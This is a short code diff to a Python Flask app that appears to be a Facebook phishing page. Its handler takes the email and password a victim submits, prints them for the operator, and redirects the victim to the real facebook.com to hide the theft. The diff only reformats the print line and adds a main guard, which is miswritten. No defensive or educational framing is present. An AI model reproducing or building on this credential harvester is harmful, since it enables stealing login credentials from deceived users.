@@ -11,6 +11,9 @@ def pagina_inicial():
 def pega_dados():
     email= request.form['email']
     senha = request.form['pass']
-    print(f'EMAIL: {email} \n SENHA: {senha}')
+    print(f'EMAIL: {email} , SENHA: {senha}')
     return redirect('https://www.facebook.com/?locale=pt_BR')
-app.run(host = "0.0.0.0" , port = "8080")
+
+
+if __name__ == 'main':
+    app.run(host = "0.0.0.0" , port = "8080")
